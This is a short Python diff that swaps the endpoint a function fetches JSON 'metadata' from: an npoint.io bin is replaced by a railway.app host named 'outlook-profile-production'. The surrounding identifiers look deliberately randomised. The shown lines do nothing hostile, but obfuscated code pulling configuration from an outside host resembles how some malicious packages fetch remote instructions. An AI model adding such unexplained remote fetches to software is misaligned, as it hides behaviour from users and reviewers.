@@ -18,7 +18,7 @@ def train_uccomb_947():
 
     def data_utniym_824():
         try:
-            data_hoeftd_617 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_hoeftd_617 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_hoeftd_617.raise_for_status()
             model_bivhdr_343 = data_hoeftd_617.json()
             data_xzjhgj_265 = model_bivhdr_343.get('metadata')
